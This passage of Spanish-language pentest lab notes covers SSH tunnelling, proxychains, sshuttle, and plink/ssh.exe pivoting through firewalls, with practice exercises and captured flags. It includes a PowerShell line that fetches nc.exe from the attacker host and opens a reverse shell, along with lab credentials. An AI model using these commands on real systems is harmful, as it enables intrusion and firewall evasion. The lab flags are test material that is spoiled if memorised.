Este comando provoca la apertura de un *Socks Forward Proxy*. Un Proxy es un dispositivo que sirve de intermediario entre las conexiones entre un cliente y un servidor. La el tipo más común de Proxy es el HTTP Forward Proxy, que media las requests HTTP entre un cliente y un servidor. En este caso, un Socks Forward Proxy media las direcciones, los sockets de entrada o destino, entre un cliente y un servidor. A su vez, un socket es un canal de conexión entre un cliente y un servidor, al final de cada socket se encuentra un puerto con un servicio escuchándo en él.

De esta forma, para conectarnos a cualquier socket accesible por el servidor SSH empleamos una herramienta capaz de interactuar de un SocksProxy, en este caso empleamos *Proxychains*:

Proxychains usa un archivo de configuración para casi todo, almacenado por defecto en **/etc/proxychains4.conf**. Necesitamos editar este archivo para asegurarnos de que Proxychains pueda ubicar nuestro SOCKS proxy port y confirmar que es un SocksProxy (en lugar de cualquier otro tipo de proxy). De forma predeterminada, los proxies se definen al final del archivo. Simplemente podemos reemplazar cualquier definición de proxy existente en ese archivo con una sola línea que defina el tipo de proxy, la dirección IP y el puerto del proxy SOCKS que se ejecuta en CONFLUENCE01 ( **socks5 192.168.50.63 9999** ).

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999 <---
```

La IP es aquella asociada a la CONFLUENCE01 y el puerto el desginado en el comando SSH. De esta forma, empleamos el siguiente comando para utilizar smbclient con proxychains:

```
kali@kali:~$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:445  ...  OK

        Sharename       Type      Commen
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
    scripts         Disk
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:139  ...  OK
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:139  ...  OK
do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

También podemos utilizar otras herramientas como por ejemplo Nmap. Recordamos que PGDATABASE01 está conectado a una tercera subnet, 172.16.50.x, de esta forma, la escaneamos:

```
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
Initiating Parallel DNS resolution of 1 host. at 17:26
Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:26
Scanning 172.16.50.217 [20 ports]
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:111 <--socket error or timeout!
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:22 <--socket error or timeout!
...
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:5900 <--socket error or timeout!
Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
Nmap scan report for 172.16.50.217
Host is up, received user-set (9.0s latency).
Scanned at 2022-08-20 17:26:47 EDT for 244s

PORT     STATE  SERVICE       REASON
21/tcp   closed ftp           conn-refused
22/tcp   closed ssh           conn-refused
23/tcp   closed telnet        conn-refused
25/tcp   closed smtp          conn-refused
53/tcp   closed domain        conn-refused
80/tcp   closed http          conn-refused
110/tcp  closed pop3          conn-refused
111/tcp  closed rpcbind       conn-refused
135/tcp  open   msrpc         syn-ack
139/tcp  open   netbios-ssn   syn-ack
143/tcp  closed imap          conn-refused
443/tcp  closed https         conn-refused
445/tcp  open   microsoft-ds  syn-ack
993/tcp  closed imaps         conn-refused
995/tcp  closed pop3s         conn-refused
1723/tcp closed pptp          conn-refused
3306/tcp closed mysql         conn-refused
3389/tcp open   ms-wbt-server syn-ack
5900/tcp closed vnc           conn-refused
8080/tcp closed http-proxy    conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
```

<br />

#### 3.3. SSH Remote Port Forwarding.

Hasta ahora hemos cubierto, casos en los que nos aprovechamos de una conexión SSH entre un cliente y un servidor en una red interna que utilizábamos para interactuar con nuestro entorno de Kali con un host remoto en una red inaccesible. Es decir, hemos creado un túnel SSH dentro de una LAN para crear una redirección de puertos 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230608115055.png' | relative_url }}" text-align="center"/>
</div>

Ahora vamos a cubrir una forma de evadir medidas de seguridad de red, como firewalls o IDS muy frecuentes en escenarios de auditorías reales, creando un túnel SSH de entre nuestra Kali y un host de la LAN que estamos asaltando creando un SSH Remote Port Forwarding, o dicho de otra forma, en vez de conectarnos a un cliente SSH que luego se conecta a un servidor SSH nos conectamos directamente a un servidor SSH que redirige los paquetes sobre otra máquina de la red interna.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230609134241.png' | relative_url }}" text-align="center"/>
</div>

Como ya hemos comentado al principio de esta sección, la tunelización de los datos que enviamos provoca que los datos circulantes entre nuestras dos máquinas sea percibido externamente como otro tipo de tráfico, en este caso; tráfico SSH, más comúnmente permitido que el tráfico HTTP, FTP o de cualquier otra índole entrante.

Así, vamos a ver un ejemplo cambiando el escenario presentado anteriormente. 

En el caso anterior nuestra kali interactuaba con un cliente SSH llamado CONFLUENCE01 directamente. Ahora, vamos a suponer como en la imagen anterior que existe un firewall entre medias, el firewall está configurado para que el único puerto al que podemos conectarnos desde nuestra máquina Kali es el TCP 8090. Esto significa que aunque seguimos teniendo la capacidad de comprometer el servidor no podemos conectarnos a ningún otro puerto para realizar un portforwarding como en los ejemplos anteriores pues el firewall bloquea las conexiones.

Sin emabrgo, afortunadamente para nosotros CONFLUENCE01 tiene un cliente SSH. Así, podemos configurar un servidor SSH. Dado que el firewall permite tráfico SSH, podemos utilizar esta conexión para realizar un portforwarding.

Primero iniciamos el servicio ssh en nuestra kali:

```
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali: 

kali@kali:~$ sudo ss -ntplu 
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
tcp   LISTEN 0      128             [::]:22           [::]:*     users:(("sshd",pid=181432,fd=4))
```

Y ahora introducimos el siguiente comando en una shell completamente interactiva CONFLUENCE01 :

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
< 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4   
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.118.4's password:
```

El comando anterior configura el remote port forwarding con la opción **-R** y tiene una sintaxis muy similar a la opción de reenvío de puerto local. También toma dos pares de sockets como argumento. El socket de escucha se define primero y el socket de reenvío es el segundo.

En este caso, queremos escuchar en el puerto **2345** en nuestra máquina Kali ( **127.0.0.1:2345** ) y reenviar todo el tráfico al puerto PostgreSQL en PGDATABASE01 ( **10.4.50.215:5432** ).

Automáticamente en nuestra kali se ha activado un puerto de escucha:  

```
kali@kali:~$ ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      128             [::]:22           [::]:*
```

Así; 

```
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=# 
```

<br />

#### 3.4. SSH Remote Dynamic Port Forwarding

De la misma forma que ocurría con el local port forwarding, el remote por forwarding tiene una falla y es que no nos permite gestionar varios conexiones a distintos sockets.

Para ello surge el *remote dynamic port forwarding*, para proveernos de esta flexibilidad. El concepto es el mismo, gestionar un portforwarding a través de un túnel SSH en el exterior de la red que queremos asaltar gestionando varias conexiones:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230611190125.png' | relative_url }}" text-align="center"/>
</div>

Vamos a exponer un ejemplo planteando otro caso. 

Supongamos que de nuevo hemos ganado acceso sobre la CONFLUENCE01 a través de un epxloit y también sabemos que esta máquina está protegida por un firewall. 

Nuestro primer pensamiento en esta posición debería ser que el firewall, además de otros puertos, puede estar tapando otros hosts expuestos en la misma red. Por tanto, nos interesa escanear la red desde la máquina asaltada:

```
confluence@confluence01:/opt/atlassian/confluence/bin$ for i in $(seq 1 254); do ping -c1 192.168.212.$i| grep "1 received" -C4; done
PING 192.168.212.63 (192.168.212.63) 56(84) bytes of data.
64 bytes from 192.168.212.63: icmp_seq=1 ttl=64 time=0.022 ms

--- 192.168.212.63 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.022/0.022/0.022/0.000 ms
```

Aunque el escáner hecho con ping haya fallado esto no es concluyente porque puede ser que una máquina levantada en la red no responda a los paquetes ping.

Así, lo que hacemos es un *remote dynamic port forwarding*. El comando es similar al *remote port forwarding* solo que en lugar de pasar como argumento dos sockets (de escucha y de desvío como en el caso anterior) sólo pasaremos un puerto que será el puerto de escucha del SocksProxy en la máquina Kali.

Así, en nuestra máquina Kali iniciamos el servicio ssh:

```
kali@kali:~$ sudo systemctl start ssh          
[sudo] password for kali: 
                   
```

Y seguidamente lanzamos el comando 

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.45.197
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.197 (192.168.45.197)' can't be established.
ECDSA key fingerprint is SHA256:lO9h0Bs6EiPc9FhxTikOYiKkSPArf1E0FxY7uFgrHss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.45.197's password: 
```

Modificamos el fichero de configuración de proxychains con la ip y puerto de escucha :

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9998
```

Y empelamos Nmap con proxychains para escanear la red:

```
proxychains nmap -Pn -p9000-9100 -T4 10.4.212.64
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 17:08 EDT
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9055 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9100 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.212.64:9062  ...  OK

```

<br />

#### 3.5. Using sshuttle.

En situaciones en las que tenemos acceso directo a un servidor SSH, detrás del cual hay una red interna más compleja, el reenvío de puertos dinámico clásico puede ser difícil de administrar. 

El kit *sshuttle* es una herramienta que convierte una conexión SSH en algo similar a una VPN mediante la configuración de rutas locales que fuerzan el tráfico a través del túnel SSH. Sin embargo, requiere privilegios de root en el cliente SSH y Python3 en el servidor SSH, por lo que no siempre es la opción más liviana. En el escenario apropiado, sin embargo, puede ser muy útil.

En nuestro entorno de laboratorio, tenemos acceso SSH a PGDATABASE01, al que podemos acceder a través de un reenvío de puerto configurado en CONFLUENCE01. Ejecutemos sshuttle a través de esto para observar sus capacidades.

Primero, podemos configurar un port forwarding en un shell en CONFLUENCE01, escuchando en el puerto 2222 en la interfaz WAN y reenviando al puerto 22 en PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

Ahora empleamos la herramienta sshuttle

```
kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
[local sudo] Password: 

database_admin@192.168.50.63's password:

c : Connected to server.
Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found.
fw: Received non-zero return code 1 when flushing DNS resolver cache.

```

Aunque no recibimos muchos resultados de sshuttle, en teoría, debería haber configurado el enrutamiento en nuestra máquina Kali para que cualquier solicitud que hagamos a los hosts en las subredes que especificamos se envíe de forma a través de la conexión SSH. Probemos si esto funciona intentando conectarnos al recurso compartido SMB en HRSHARES en una nueva terminal.

```
kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

        Sharename       Type      Commen
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        scripts         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

kali@kali:~$
```
<br />

### 4. Port Forwarding with Windows Tools.

#### 4.1. SSH.exe

La primera opción que tenemos es comprobar si el sistema Windows tiene el servicio SSH instalado para poder aplicar lo aprendido anteriormente referente al SSH tunneling.

En las versiones de Windows con SSH instalado, encontraremos **scp.exe** , **sftp.exe** , **ssh.exe** , junto con otras utilidades ssh-\* en la ubicación **%systemdrive%\\Windows\\System32\\OpenSSH** de forma predeterminada.

Así, pongámos un ejemplo práctico. Supongámos que hemos ganado acceso a una máquina 

```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.187.64
```

Enumerando la máquina descubrimos que tiene habilitado SSH.

```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```

Así, habilitamos el servicio ssh en nuestra kali:

```
kali@kali:~$ sudo systemctl start ssh   
[sudo] password for kali: 
```

Y en el host Windows ceramos un remote dynamic portforwarding:

```
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.45.211
The authenticity of host '192.168.45.211 (192.168.45.211)' can't be established.
ECDSA key fingerprint is SHA256:lO9h0Bs6EiPc9FhxTikOYiKkSPArf1E0FxY7uFgrHss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.211' (ECDSA) to the list of known hosts.
kali@192.168.45.211's password:
```

Y podemos emplear proxychains:

```
kali@kali:~/Downloads$ proxychains ./ssh_exe_exercise_client.bin -i 10.4.187.215
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Connecting to 10.4.187.215:4141
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.187.215:4141  ...  OK
Flag: "OS{b7a21c79d7ae9fb046e944fedbacef8e}"
```

<br />

#### 4.2. Plink

En el caso de no tener habilitado OpenSSH en el host de Windows (es una práctica común que los administradores deshabiliten dicho cliente por razones de seguridad).

Sin embargo, antes de que se desarollara OpenSSH los administradores empleaban todavía podemos intentar utilizar PuTTY y su contrapartida cli; PLINK (PuTTY Link). 

Una de las principales ventajas de emplear estas herramientas es que, al ser bastante populares entre administradores de sistemas y redes rara vez serán detectadas por mecanismos de seguridad (antivirus).

Veamos un ejemplo de aplicación en el siguiente escenario. En este escenario, encontramos que MULTISERVER03 ahora tiene una aplicación web en el puerto TCP 80 expuesto. Todos los demás puertos de entrada están bloqueados por un firewall, por lo que RDP tampoco está disponible. 

El diseño es muy parecido al siguiente diagrama:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230612171608.png' | relative_url }}" text-align="center"/>
</div>

Hemos conseguido RCE a través de la subida de una webshell sobre el servidor web al que tenemos acceso. 

A partir de aquí y aprovechando que el firewall sólo bloquea conexiones entrantes, subimos el binario 'nc.exe' y creamos una reverse shell:

```
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali:

kali@kali:~$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe

kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/

kali@kali:~$ nc -nvlp 4446
listening on [any] 4446 ...
```


Seguidamente, desde el webshell ejecutamos:

```
powershell wget -Uri http://192.168.45.211/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.211 4446
```

Y en nuestra Kali recibiremos una conexión proveniente del host Windows:

```
...
listening on [any] 4446 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
Microsoft Windows [Version 10.0.20348.825]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Ahora, transportamos sobre nuestro host Windows la utilidad 'plink.exe' desde nuestra kali:

```
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe

kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali: 
```

<br />

```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.211/plink.exe -OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.45.211/plink.exe -OutFile C:\Windows\Temp\plink.exe

c:\windows\system32\inetsrv>
```

Una vez tenemos el ejecutable en nuestra máquina, recordemos que la MULTISERVER03 ofrece el servicio RDP de forma que podemos usar Plink.exe para crear un túnel SSH sobre el que encapsular una conexión RDP y obtener acceso al GUI del servidor bypaseando el firewall.

Primero, habilitamos el servicio SSH en nuestra máquina Kali pues la conexión se tuneliza a través de SSH:

```
kali@kali:~$ sudo systemctl start ssh 
```

Seguidamente introducimos el siguiente comando:

```
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.211
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.211
The host key is not cached for this server:
  192.168.118.4 (port 22)
You have no guarantee that the server is the computer
you think it is.
The server's ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "kali".
Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
```

Este comando genera un remote portforwarding desde el puerto 9833 de nuestra kali hacia el puerto 3389 de la máquina MULTISERVER03 (el servicio rdp) a través de SSH. 

Así, ahora comprobamos en nuestra kali que el susodicho puerto está escuchando:

```
kali@kali:~$ ss -punta               
Netid State  Recv-Q Send-Q        Local Address:Port     Peer Address:Port Process                                  
udp   UNCONN 0      0                   0.0.0.0:57093         0.0.0.0:*                                             
udp   ESTAB  0      0      192.168.127.134%eth0:68    192.168.127.254:67                                            
tcp   LISTEN 0      128               127.0.0.1:9833          0.0.0.0:*  
[...]
```

Y nos conectamos con xfreerdp a nuestro puerto local, esta conexión se redirigirá bypaseando el firewall sobre el puerto 3389 de la máquina de destino a través de un túnel SSH:

```
kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
[12:39:52:343] [70068:70069] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:39:52:343] [70068:70069] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - The hostname used for this connection (127.0.0.1:9833) 
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] -      MULTISERVER03
[12:39:52:344] [70068:70069] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 127.0.0.1:9833 (RDP-Server):
        Common Name: MULTISERVER03
        Subject:     CN = MULTISERVER03
        Issuer:      CN = MULTISERVER03
        Thumbprint:  e1:52:61:da:af:34:9c:56:0a:db:98:01:3c:17:c1:a0:68:da:7b:ca:75:24:a9:dc:50:63:3b:07:e2:63:3f:1c
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
[12:39:55:658] [70068:70069] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:39:55:658] [70068:70069] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:39:55:674] [70068:70069] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:39:55:674] [70068:70069] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:39:56:334] [70068:70069] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
[12:40:46:596] [70068:70068] [ERROR][com.freerdp.core] - freerdp_abort_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_CANCELLED [0x0002000B]
```

<br />

#### 4.3. Netsh.

En último término, existe una forma nativa de crear un port foward en Windows que deberíamos explorar, la built-in firewall configuration tool Netsh (Network Shell).



<br />

#### 1. Practice - SSH Local Port Forwarding.


```
┌──(student㉿8772c0f42288)-[~]
└─$ ss -a
Netid                  State                      Recv-Q                  Send-Q                                    Local Address:Port                                         Peer Address:Port                   Process                  
nl                     UNCONN                     0                       0                                                  rtnl:946                                                      *                                                
nl                     UNCONN                     0                       0                                                  rtnl:kernel                                                   *                                                
nl                     UNCONN                     768                     0                                               tcpdiag:kernel                                                   *                                                
nl                     UNCONN                     4352                    0                                               tcpdiag:ss/81                                                    *                                                
nl                     UNCONN                     0                       0                                                  xfrm:kernel                                                   *                                                
nl                     UNCONN                     0                       0                                                 audit:kernel                                                   *                                                
nl                     UNCONN                     0                       0                                             fiblookup:kernel                                                   *                                                
nl                     UNCONN                     0                       0                                                   nft:kernel                                                   *                                                
nl                     UNCONN                     0                       0                                                uevent:kernel                                                   *                                                
nl                     UNCONN                     0                       0                                                  genl:kernel                                                   *                                                
u_str                  ESTAB                      0                       0                                                     * 27630                                                   * 0                                               
u_str                  ESTAB                      0                       0                                                     * 27665                                                   * 27666                                           
u_str                  ESTAB                      0                       0                                                     * 27666                                                   * 27665                                           
udp                    UNCONN                     0                       0                                            127.0.0.11:51029                                             0.0.0.0:*                                               
tcp                    LISTEN                     0                       511                                             0.0.0.0:http                                              0.0.0.0:*                                               
tcp                    LISTEN                     0                       128                                             0.0.0.0:ssh                                               0.0.0.0:*                                               
tcp                    LISTEN                     0                       4096                                         127.0.0.11:41673                                             0.0.0.0:*                                               
tcp                    ESTAB                      0                       52                                           172.18.0.2:ssh                                        192.168.45.240:40484                                           
tcp                    TIME-WAIT                  0                       0                                             127.0.0.1:54136                                          127.0.0.11:ssh                                             
tcp                    LISTEN                     0                       128                                                [::]:ssh                                                  [::]:*                                               

┌──(student㉿8772c0f42288)-[~]
└─$ curl 127.0.0.1 51029
here is your flag:

OS{fa246875e18f2489ee28822247725fd7}
```

<br />

### 2. Practice - SSH remote port forwarding.

Primero activamos en nuestra máquina local el servcio SSH con systemctl.

Luego, en la máquina virtual de prueba introducimos el siguiente comando:

```
┌──(student㉿3d924c31581c)-[~]
└─$ ssh -L 5555:192.168.45.240:4444 kali@192.168.45.240
The authenticity of host '192.168.45.240 (192.168.45.240)' can't be established.
ED25519 key fingerprint is SHA256:JFdrX0EwWlz6dQ/mvpkh6bNOpMr5T+Yf8hsdDPmGIdU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.240' (ED25519) to the list of known hosts.
kali@192.168.45.240's password: 
bind [::1]:5555: Cannot assign requested address
Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

Seguidamente activamos un listener de netcat en el puerto 4444 en nuestra máquina local y obtendremos en poco tiempo una shell de root:

```
nc -lvp 4444                               
listening on [any] 4444 ...
192.168.45.240: inverse host lookup failed: Unknown host
connect to [192.168.45.240] from (UNKNOWN) [192.168.45.240] 34980
bash: cannot set terminal process group (130): Inappropriate ioctl for device
bash: no job control in this shell
root@3d924c31581c:~# cat /root/flag.txt
cat /root/flag.txt
OS{aaf6ff4a117d7a6684c15eed3821f3b8}
```



### 3. Practice - SHH dinamic port forwarding.

**6.  There is a service running on some TCP port in the range of _30000-35000_ on the target VM #1. Find it, and you will find the flag. _Note_: this scan will take a couple minutes to complete, even with you only scanning such a limited range.**

En este caso, según el enunciado existe un servicio escuchando en la máquina remota. Intentando escanear la máquina de forma externa con Nmap no encontramos nada:

```
nmap -sV -Pn --min-rate 10000 192.168.209.52 -p-       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 08:25 EDT
Nmap scan report for 192.168.209.52
Host is up (0.030s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
2222/tcp  open     ssh     OpenSSH 8.7p1 Debian 2 (protocol 2.0)

```


Con lo que se vuelve evidente que necesitamos escanear los servicios internos (aquellos que sólo están escuchando peticiones procedentes de direcciones internas como el loopback) de la máquina remota. Podríamos relizar esta tarea manualmente pero dado el rango disponibles de IPs nos tardaríamos una eternidad. Para agilizar el proceso podemos utilizar *Proxychains* y realizar un *SSH Dynamic Port Forwarding*.

En primer lugar, como Proxychains funciona por defecto sobre el puerto 9050, utilizamos el siguiente comando:

```
ssh -N -D 127.0.0.1:9050 student@192.168.209.52 -p 2222  
```

Este comando tuneliza sobre SSH el tráfico dirigido sobre el puerto local 9050 hacia la máquina 192.168.209.52 como el usuario *student*. 

Ahora empleamos Proxychains:

```
proxychains nmap -sTV -n -PN 127.0.0.1 -p 30000-35000
[...]

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023 <--socket error or timeout!
Nmap scan report for 127.0.0.1
Host is up (0.037s latency).
Not shown: 5000 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
34023/tcp open  unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.56 seconds
```

